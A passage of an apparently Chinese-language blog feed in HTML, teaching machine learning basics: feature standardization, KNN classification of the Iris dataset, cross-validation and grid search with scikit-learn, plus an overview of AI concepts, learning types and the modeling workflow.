class="number">10</span>, <span class="number">40</span>],</span><br><span class="line">        [<span class="number">60</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">45</span>],</span><br><span class="line">        [<span class="number">75</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">46</span>]</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2.初始化标准化对象</span></span><br><span class="line">    transformer = StandardScaler()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3.对原始特征进行变换(特征处理)</span></span><br><span class="line">    data = transformer.fit_transform(raw_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4.打印归一化结果</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#5.打印每一列的均值和方差</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;transformer.mean_--&gt;&#x27;</span>, transformer)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;transformer.var_--&gt;&#x27;</span>, transformer.var_)</span><br></pre></td></tr></table></figure><p>对于标准化来说，如果出现异常点，由于具有<strong>一定数据量</strong>，<strong>少量</strong>的异常点<strong>对于平均值的影响并不大</strong></p><h3 id="利用KNN算法进行鸢尾花分类"><a href="#利用KNN算法进行鸢尾花分类" class="headerlink" title="利用KNN算法进行鸢尾花分类"></a>利用KNN算法进行鸢尾花分类</h3><p>鸢尾花Iris Dataset数据集是机器学习领域经典数据集，鸢尾花数据集包含了150条鸢尾花信息，每50条取自三个鸢尾花中之一：Versicolour（变色鸢尾）、Setosa（山鸢尾）和Virginica（维吉尼亚鸢尾）</p><p>花瓣petal，花萼sepal</p><style>.lhilwjzfofin{zoom:50%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/0_QHogxF9l4hy0Xxub-1747654811063-25.png" class="lhilwjzfofin" alt="0_QHogxF9l4hy0Xxub"><p>每个花的特征用如下属性描述：</p><style>.gfvtdumqudte{zoom:67%;}</style><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/0_SHhnoaaIm36pc1bd-1747654838095-27.png" class="gfvtdumqudte" alt="0_SHhnoaaIm36pc1bd"><p>代码实现：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.加载数据集</span></span><br><span class="line">iris_data = load_iris()</span><br><span class="line"><span class="comment"># print(iris_data)</span></span><br><span class="line"><span class="comment"># print(iris_data.target)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.数据展示</span></span><br><span class="line">iris_df = pd.DataFrame(iris_data[<span class="string">&#x27;data&#x27;</span>], columns=iris_data.feature_names)</span><br><span class="line">iris_df[<span class="string">&#x27;label&#x27;</span>] = iris_data.target</span><br><span class="line"><span class="comment"># print(iris_data.feature_names)</span></span><br><span class="line"><span class="comment"># sns.lmplot(x=&#x27;sepal length (cm)&#x27;,y=&#x27;sepal width (cm)&#x27;,data = iris_df,hue=&#x27;label&#x27;)</span></span><br><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.特征工程(预处理-标准化)</span></span><br><span class="line"><span class="comment"># 3.1 数据集划分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(iris_data.data, iris_data.target, test_size=<span class="number">0.3</span>, random_state=<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(iris_data.data))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(x_train))</span><br><span class="line"><span class="comment"># 3.2 标准化</span></span><br><span class="line">process = StandardScaler()</span><br><span class="line">x_train = process.fit_transform(x_train)</span><br><span class="line">x_test = process.transform(x_test)</span><br><span class="line"><span class="comment"># 4.模型训练</span></span><br><span class="line"><span class="comment"># 4.1 实例化</span></span><br><span class="line">model = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 4.2 调用fit法</span></span><br><span class="line">model.fit(x_train,y_train)</span><br><span class="line"><span class="comment"># 5.模型预测</span></span><br><span class="line">x = [[<span class="number">5.1</span>, <span class="number">3.5</span>, <span class="number">1.4</span>, <span class="number">0.2</span>]]</span><br><span class="line">x=process.transform(x)</span><br><span class="line">y_predict =model.predict(x_test)</span><br><span class="line"><span class="built_in">print</span>(model.predict_proba(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.模型评估(准确率)</span></span><br><span class="line"><span class="comment"># 6.1 使用预测结果</span></span><br><span class="line">acc =accuracy_score(y_test,y_predict)</span><br><span class="line"><span class="built_in">print</span>(acc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.2 直接计算</span></span><br><span class="line">acc = model.score(x_test,y_test)</span><br><span class="line"><span class="built_in">print</span>(acc)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="超参数选择的方法"><a href="#超参数选择的方法" class="headerlink" title="超参数选择的方法"></a>超参数选择的方法</h2><h3 id="超参数的定义与核心作用"><a href="#超参数的定义与核心作用" class="headerlink" title="超参数的定义与核心作用"></a>超参数的定义与核心作用</h3><p><strong>超参数</strong>是机器学习模型在训练前需<strong>人为设定的参数</strong>，用于<strong>控制</strong>模型的<strong>学习过程和性能</strong>，其选择直接影响模型的<strong>训练效果和泛化能力</strong>。与<strong>模型参数</strong>（如线性回归的权重）不同，超参数无法通过数据自动学习，需通过<strong>经验或优化方法确定</strong></p><h3 id="交叉验证"><a href="#交叉验证" class="headerlink" title="交叉验证"></a>交叉验证</h3><p>交叉验证是一种<strong>数据集的分割方法</strong>，将训练集划分为 n 份，其中<strong>一份做验证集</strong>、其他n-1份做训练集</p><p><img src="/2025/04/19/KNN%E7%AE%97%E6%B3%95/image-20230831163236810-1747654869823-29.png" alt="image-20230831163236810"></p><p><strong>交叉验证法原理</strong>：将数据集划分为 <strong>cv&#x3D;10 份</strong>：</p><ul><li><ol><li>第一次：把<strong>第一份</strong>数据做<strong>验证集</strong>，其他数据<strong>做训练</strong></li></ol></li><li><ol start="2"><li>第二次：把第二份数据做验证集，其他数据做训练</li></ol></li><li><ol start="3"><li>… 以此类推，<strong>总共训练10次</strong>，<strong>评估10次</strong>。</li></ol></li><li><ol start="4"><li>使用训练集+验证集多次评估模型，<strong>取平均值</strong>做交叉验证为<strong>模型得分</strong></li></ol></li><li><ol start="5"><li>若k&#x3D;5模型得分最好，再使用全部训练集(训练集+验证集) 对k&#x3D;5模型<strong>再训练一遍</strong>，<strong>再</strong>使用测试集对k&#x3D;5模型<strong>做评估</strong></li></ol></li></ul><blockquote><p>交叉验证法，是划分数据集的一种方法，目的就是为了得到<strong>更加准确</strong>可信的<strong>模型评分</strong>。</p></blockquote><h3 id="网格搜索"><a href="#网格搜索" class="headerlink" title="网格搜索"></a>网格搜索</h3><ul><li><p>网格搜索的需求</p><ul><li>模型有很多<strong>超参数（如k）</strong>，其能力也存在很大的差异。需要<strong>手动产生很多超参数组合</strong>，来<strong>训练模型</strong></li><li>每组超参数都采用<strong>交叉验证</strong>评估，最后选出最优参数组合建立模型</li></ul></li><li><p>网格搜索是<strong>模型调参</strong>的<strong>有力工具</strong>。寻找<strong>最优超参数</strong>的工具</p><blockquote><p>只需要将<strong>若干参数</strong>传递给<strong>网格搜索对象</strong>，它自动帮我们完成<strong>不同超参数的组合</strong>、<strong>模型训练</strong>、<strong>模型评估</strong>，最终<strong>返回一组最优</strong>的超参数</p></blockquote></li><li><p>网格搜索 + 交叉验证的强力组合 (模型选择和调优)</p><ul><li>交叉验证解决<strong>模型的数据输入问题</strong>(数据集划分)得到更可靠的模型</li><li>网格搜索解决<strong>超参数组合</strong></li><li>两个组合在一起形成一个模型参数调优的解决方案</li></ul></li></ul><p><img src="/./KNN%E7%AE%97%E6%B3%95/image-20230910154650041-1747654887000-31.png" alt="image-20230910154650041"></p><h3 id="交叉验证网格搜索的API"><a href="#交叉验证网格搜索的API" class="headerlink" title="交叉验证网格搜索的API"></a>交叉验证网格搜索的API</h3><ul><li>参数详解</li></ul><table><thead><tr><th align="center"><strong>参数</strong></th><th align="center"><strong>功能说明</strong></th></tr></thead><tbody><tr><td align="center"><code>estimator</code></td><td align="center">指定待调参的模型对象（如KNN、SVM、随机森林等）。</td></tr><tr><td align="center"><code>param_grid</code></td><td align="center">超参数网格字典，定义需搜索的参数组合（例如<code>&#123;&quot;n_neighbors&quot;: [1,3,5]&#125;</code>）。</td></tr><tr><td align="center"><code>cv</code></td><td align="center">交叉验证折数（如<code>cv=5</code>表示5折交叉验证）。</td></tr></tbody></table><ul><li>方法</li></ul><table><thead><tr><th align="center"><strong>方法&#x2F;属性</strong></th><th align="center"><strong>作用</strong></th></tr></thead><tbody><tr><td align="center"><code>fit(X, y)</code></td><td align="center">输入训练数据，执行交叉验证网格搜索。</td></tr><tr><td align="center"><code>score(X, y)</code></td><td align="center">返回模型在测试数据上的准确率（需在<code>fit</code>后调用）。</td></tr><tr><td align="center"><code>best_score_</code></td><td align="center">交叉验证中验证集的最佳得分（如最高准确率）。</td></tr><tr><td align="center"><code>best_estimator_</code></td><td align="center">返回最优超参数对应的模型对象（可直接用于预测）。</td></tr><tr><td align="center"><code>cv_results_</code></td><td align="center">保存每次交叉验证的详细结果（包括训练集和验证集的得分、参数组合等）。</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 定义模型及参数网格</span></span><br><span class="line">knn = KNeighborsClassifier()</span><br><span class="line">param_grid = &#123;<span class="string">&quot;n_neighbors&quot;</span>: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]&#125;  <span class="comment"># 搜索k=1,3,5,7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 初始化GridSearchCV对象</span></span><br><span class="line">grid_search = GridSearchCV(</span><br><span class="line">    estimator=knn, <span class="comment"># 待调优的模型对象</span></span><br><span class="line">    param_grid=param_grid,</span><br><span class="line">    cv=<span class="number">5</span>  <span class="comment"># 5折交叉验证</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 训练并输出结果</span></span><br><span class="line">grid_search.fit(X_train, y_train)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最优k值：<span class="subst">&#123;grid_search.best_estimator_.n_neighbors&#125;</span>&quot;</span>)  <span class="comment"># 如输出5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;验证集最高准确率：<span class="subst">&#123;grid_search.best_score_:<span class="number">.2</span>f&#125;</span>&quot;</span>)     <span class="comment"># 如0.92</span></span><br></pre></td></tr></table></figure><p>交叉验证网格搜索在鸢尾花分类中的应用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0.导入工具包</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split,GridSearchCV</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.加载数据</span></span><br><span class="line">data = load_iris()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 数据集划分</span></span><br><span class="line">x_train,x_test,y_train,y_test=train_test_split(data.data,data.target,test_size=<span class="number">0.2</span>,random_state=<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.特征预处理</span></span><br><span class="line">pre = StandardScaler()</span><br><span class="line">x_train=pre.fit_transform(x_train)</span><br><span class="line">x_test=pre.transform(x_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.模型实例化+交叉验证+网格搜索</span></span><br><span class="line">model = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br><span class="line">paras_grid = &#123;<span class="string">&#x27;n_neighbors&#x27;</span>:[<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;</span><br><span class="line"><span class="comment"># estimator =GridSearchCV(estimator=model,param_grid=paras_grid,cv=4)</span></span><br><span class="line"><span class="comment"># estimator.fit(x_train,y_train)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(estimator.best_score_)</span></span><br><span class="line"><span class="comment"># print(estimator.best_estimator_)</span></span><br><span class="line"><span class="comment"># print(estimator.cv_results_)</span></span><br><span class="line"></span><br><span class="line">model = KNeighborsClassifier(n_neighbors=<span class="number">7</span>)</span><br><span class="line">model.fit(x_train,y_train)</span><br><span class="line">x = [[<span class="number">5.1</span>, <span class="number">3.5</span>, <span class="number">1.4</span>, <span class="number">0.2</span>]]</span><br><span class="line">x=pre.transform(x)</span><br><span class="line">y_prdict=model.predict(x_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_test,y_prdict))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习概述</title>
      <link href="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/"/>
      <url>/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习概述"><a href="#机器学习概述" class="headerlink" title="机器学习概述"></a>机器学习概述</h1><h2 id="人工智能三大概念"><a href="#人工智能三大概念" class="headerlink" title="人工智能三大概念"></a>人工智能三大概念</h2><h3 id="人工智能-AI-Artificial-Intelligence"><a href="#人工智能-AI-Artificial-Intelligence" class="headerlink" title="人工智能(AI): Artificial Intelligence"></a>人工智能(AI): Artificial Intelligence</h3><ul><li><p>像人一样机器智能的综合与分析；机器模拟人类</p></li><li><p>释义：是一个系统，像人那样思考 像人那样理性思考  </p></li><li><p>释义：是一个系统，像人那样活动 像人那样合理系统</p></li></ul><h3 id="机器学习-ML-Machine-Learning"><a href="#机器学习-ML-Machine-Learning" class="headerlink" title="机器学习(ML): Machine Learning"></a>机器学习(ML): Machine Learning</h3><ul><li>让机器<strong>自动学习</strong>，而不是基于规则的编程（不依赖特定规则编程）</li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830154802582.png" alt="image-20230830154802582"></p><ul><li>从数据中获取规律；来了一个新的数据，产生一个新的预测</li></ul><h3 id="深度学习-DL-Deep-Learning"><a href="#深度学习-DL-Deep-Learning" class="headerlink" title="深度学习(DL): Deep Learning"></a>深度学习(DL): Deep Learning</h3><p>深度学习 : ，也叫<strong>深度神经网络</strong>，大脑仿生，设计一层一层的神经元<strong>模拟万事万物</strong></p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830155136554.png" alt="image-20230830155136554"></p><h3 id="三者之间的关系"><a href="#三者之间的关系" class="headerlink" title="三者之间的关系"></a>三者之间的关系</h3><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20250410155154900.png" alt="image-20250410155154900"></p><p>机器学习是实现人工智能的一种<strong>途径</strong></p><p>深度学习是机器学习的一种<strong>方法</strong></p><h3 id="学习方式"><a href="#学习方式" class="headerlink" title="学习方式"></a>学习方式</h3><h4 id="基于规则的学习"><a href="#基于规则的学习" class="headerlink" title="基于规则的学习"></a>基于规则的学习</h4><p>基于规则的预测 ： 程序员根据经验利用<strong>手工的if-else方式</strong>进行预测</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830160037927.png" alt="image-20230830160037927"></p><p>但是有好多问题， <strong>无法明确的写下规则</strong>，此时我们无法使用规则学习的方式来解决这一类问题，比如：</p><ul><li>图像和语音识别</li><li>自然语言处理</li></ul><h4 id="基于模型的学习"><a href="#基于模型的学习" class="headerlink" title="基于模型的学习"></a>基于模型的学习</h4><p>基于模型的学习就是通过<strong>编写机器学习算法</strong>，让机器自己学习<strong>从历史数据中</strong>获得经验、训练模型：</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/04.jpg" alt="04"></p><p>案例巩固</p><p>比如房价预测，数据如下图</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20220117155634566.png" alt="image-20220117155634566"></p><ul><li>我们可以使用一条直线尽可能多的通过这些点，不通过的点尽量分布在直线的两侧，利用这条直线所表示的线性关系，我们就可以预测房价。</li><li>直线可以写成y&#x3D;ax+b，若a,b已知，我们就能够预测房价。机器学习中a,b称为<strong>参数</strong>，y&#x3D;ax+b称为<strong>模型</strong>。通常a,b未知，是我们需要求解的量。</li></ul><h2 id="人工智能应用领域和发展史"><a href="#人工智能应用领域和发展史" class="headerlink" title="人工智能应用领域和发展史"></a>人工智能应用领域和发展史</h2><h3 id="发展史"><a href="#发展史" class="headerlink" title="发展史"></a>发展史</h3><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20240723143316864.png" alt="image-20240723143316864"></p><hr><h3 id="机器学习发展三要素"><a href="#机器学习发展三要素" class="headerlink" title="机器学习发展三要素"></a>机器学习发展三要素</h3><ul><li><strong>数据、算法、算力</strong>三要素相互作用，是AI发展的基石</li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830164846564.png" alt="image-20230830164846564"></p><ol><li><strong>CPU</strong>：负责调度任务、计算任务等；主要适合I\O密集型的任务</li><li><strong>GPU</strong>：更加适合矩阵运算；主要适合计算密集型任务</li><li><strong>TPU：Tensor</strong>，专门针对神经网络训练设计一款处理器</li></ol><h2 id="机器学习常见术语"><a href="#机器学习常见术语" class="headerlink" title="机器学习常见术语"></a>机器学习常见术语</h2><h3 id="样本，特征，标签-目标值"><a href="#样本，特征，标签-目标值" class="headerlink" title="样本，特征，标签&#x2F;目标值"></a>样本，特征，标签&#x2F;目标值</h3><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830170447442.png" alt="image-20230830170447442"></p><p><strong>样本(sample)</strong> ：<strong>一行数据</strong>就是<strong>一个样本</strong>；多个样本组成数据集；有时<strong>一条样本</strong>被叫成<strong>一条记录</strong>；</p><p>通常由<strong>特征</strong>和<strong>标签</strong>构成</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830172741928.png" alt="image-20230830172741928"></p><p><strong>特征(feature)</strong> ：<strong>一列数据一个特征</strong>，有时也被称为<strong>属性</strong></p><p> 用X_train或X_test表示</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830172814624.png" alt="image-20230830172814624"></p><p><strong>标签&#x2F;目标(label&#x2F;target)</strong> ：模型<strong>要预测的那一列数据</strong>。本场景是就业薪资</p><p>用Y_train或Y_test表示 </p><p>特征如何理解：特征是从数据中<strong>抽取</strong>出来的，对<strong>结果预测</strong>有用的信息(不是所有信息)  如:房价预测、车图片识别</p><h3 id="数据集-样本的集合-划分"><a href="#数据集-样本的集合-划分" class="headerlink" title="数据集(样本的集合)划分"></a>数据集(样本的集合)划分</h3><p>多行样本组成数据集</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830173235334.png" alt="image-20230830173235334"></p><p>数据集可划分两部分：训练集、测试集  比例：8 : 2，7 : 3 </p><p>训练集(training set) ：用来<strong>学习数据模式，优化模型参数</strong>（model）的数据集</p><p>测试集(testing set)：用来<strong>模拟真实场景，评估性能模型</strong>的数据集，与训练集完全独立</p><h2 id="机器学习算法分类"><a href="#机器学习算法分类" class="headerlink" title="机器学习算法分类"></a>机器学习算法分类</h2><h3 id="有监督学习"><a href="#有监督学习" class="headerlink" title="有监督学习"></a>有监督学习</h3><ul><li><p>定义：输入数据是由<strong>输入特征值和目标值</strong>所组成，即输入的训练数据<strong>有标签的</strong></p></li><li><p>数据集：需要人工标注数据</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830173907526.png" alt="image-20230830173907526"></p></li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li><p>目标值（标签值）是<strong>不连续</strong>的</p></li><li><p>分类种类：二分类、多分类任务、</p></li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830174449204.png" alt="image-20230830174449204"></p><h4 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h4><p>目标值（标签值）是<strong>连续</strong>的</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830174516047.png" alt="image-20230830174516047"></p><hr><h3 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h3><ul><li><p>定义：输入数据<strong>没有被标记</strong>，即样本数据类别未知，<strong>没有标签</strong>，根据样本间的<strong>相似性</strong>，对样本集<strong>聚类</strong>，以发现事物<strong>内部结构及相互关系</strong>。</p></li><li><p>数据集：不需要标注数据</p></li></ul><ul><li><strong>无监督学习特点：</strong><ul><li>1 ：训练数据<strong>无标签</strong></li><li>2 ：根据样本间的相似性对样本集进行聚类，发现事物<strong>内部结构及相互关系</strong></li></ul></li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830174630247.png" alt="image-20230830174630247"></p><hr><h3 id="半监督学习"><a href="#半监督学习" class="headerlink" title="半监督学习"></a>半监督学习</h3><ul><li><p>定义：通过同时利用少量<strong>有标记数据</strong>和大量<strong>无标记数据</strong>来提升模型的性能与泛化能力</p></li><li><p>原理：</p><ul><li><p>利用已经<strong>标记的数据</strong>（也就  是带有类标签）训练出一个模型</p></li><li><p>再利用该模型去套用<strong>未标记的数据</strong></p></li><li><p><strong>（人工矫正）<strong>通过询问领域专家分类结果与模型分类结果</strong>做对比</strong>从而对模型做进 一步改善和提高</p></li></ul></li><li><p>核心机制</p><ul><li>数据构成：<strong>有标记数据</strong>和<strong>无标记数据</strong></li><li>目标：成本高或数据少情况下，挖掘无标记数据的<strong>潜在信息</strong>，弥补有监督学习中<strong>标记不足</strong>的缺陷，提升模型在数据上的表现。</li></ul></li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830174748910.png" alt="image-20230830174748910"></p><p><strong>半监督学习方式可大幅降低标记成本</strong></p><h3 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h3><ul><li><p>强化学习（Reinforcement Learning）：机器学习的一个重要分支</p></li><li><p>应用场景：里程碑AlphaGo围棋、各类游戏、对抗比赛、无人驾驶场景</p></li><li><p>核心目标：让智能体（Agent）通过与环境的动态交互，自主习得最优决策策略，以最大化长期累积奖励</p></li><li><p>核心机制：</p><ul><li><strong>试错与延迟反馈</strong>智能体通过不断尝试动作(action)，获得环境奖励反馈的奖励信号(Reward)，逐步优化策略。</li><li><strong>马尔可夫决策过程</strong>：强化学习的数学模型，强调当前状态仅依赖于前一状态和动作，与历史无关。</li></ul></li><li><p><strong>基本组成要素</strong></p></li></ul><table><thead><tr><th align="center"><strong>要素</strong></th><th align="center"><strong>描述</strong></th><th align="center"><strong>示例</strong></th></tr></thead><tbody><tr><td align="center"><strong>智能体（Agent）</strong></td><td align="center">执行决策的主体，如自动驾驶中的车辆、游戏中的角色。</td><td align="center">超级马里奥中的马里奥。</td></tr><tr><td align="center"><strong>环境（Environment）</strong></td><td align="center">智能体交互的对象，提供状态和奖励反馈。</td><td align="center">游戏程序、物理世界。</td></tr><tr><td align="center"><strong>状态（State）</strong></td><td align="center">对当前环境的抽象表示，如棋盘棋子位置或传感器数据。</td><td align="center">围棋棋盘布局。</td></tr><tr><td align="center"><strong>动作（Action）</strong></td><td align="center">智能体可执行的操作集合。</td><td align="center">马里奥的“跳跃”“移动”，自动驾驶中的“加速”“转向”。</td></tr><tr><td align="center"><strong>奖励（Reward）</strong></td><td align="center">环境反馈的标量信号，指导智能体行为优化。</td><td align="center">游戏通关奖励+1000，碰撞敌人惩罚-1000。</td></tr><tr><td align="center"><strong>策略（Policy）</strong></td><td align="center">状态到动作的映射规则，决定智能体行为。</td><td align="center">基于价值（Value-based）或直接优化策略（Policy-based）。</td></tr></tbody></table><p> agent：根据<strong>环境状态</strong>进行<strong>行动</strong>获得最多的累计奖励。</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830175128039.png" alt="image-20230830175128039"></p><p>小孩子学走路：</p><p>​    (1) 小孩就是 <strong>agent</strong>，他试图通过采取<strong>行动</strong>（即行走）来操纵<strong>环境</strong>（地面）</p><p>​    (2) 并且从<strong>一个状态转变到另一个状态</strong>（即他走的每一步）</p><p>​    (3) 当他完成任务的子任务（即走了几步）时，孩子得到<strong>奖励</strong>（给巧克力吃）</p><p>​    (4) 并且当他不能走路时，就不会给巧克力。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20240723191436541.png" alt="image-20240723191436541"></p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20240723191405779.png" alt="image-20240723191405779"></p><h2 id="机器学习的建模流程"><a href="#机器学习的建模流程" class="headerlink" title="机器学习的建模流程"></a>机器学习的建模流程</h2><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830180151157.png" alt="image-20230830180151157"></p><ul><li>获取数据：搜集与完成机器学习任务相关的数据集 </li><li>数据基本处理：数据集中异常值,缺失值的处理等 </li><li>特征工程：对数据特征进行提取、转成向量，让模型达到最好的效果 </li><li>机器学习(模型训练)：选择合适的算法对模型进行训练 </li><li>模型评估：评估效果好上线服务,评估效果不好则重复上述步骤</li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831115439968.png" alt="image-20230831115439968"></p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230830180344230.png" alt="image-20230830180344230"></p><h3 id="三大经典任务"><a href="#三大经典任务" class="headerlink" title="三大经典任务"></a>三大经典任务</h3><h4 id="回归问题"><a href="#回归问题" class="headerlink" title="回归问题"></a>回归问题</h4><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/%7B97E1FEFF-2C83-4A87-B737-FD1BAD2D2990%7D.png" alt="{97E1FEFF-2C83-4A87-B737-FD1BAD2D2990}"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ==== 第一部分：模型训练与预测 ====</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm01_Regression_Pred</span>():</span><br><span class="line">    <span class="comment"># 准备数据 [平时成绩, 期末成绩]</span></span><br><span class="line">    x = [[<span class="number">180</span>,<span class="number">86</span>], [<span class="number">82</span>,<span class="number">80</span>], [<span class="number">90</span>,<span class="number">80</span>], [<span class="number">86</span>,<span class="number">94</span>], [<span class="number">94</span>,<span class="number">90</span>]]</span><br><span class="line">    y = [<span class="number">84.2</span>, <span class="number">80.6</span>, <span 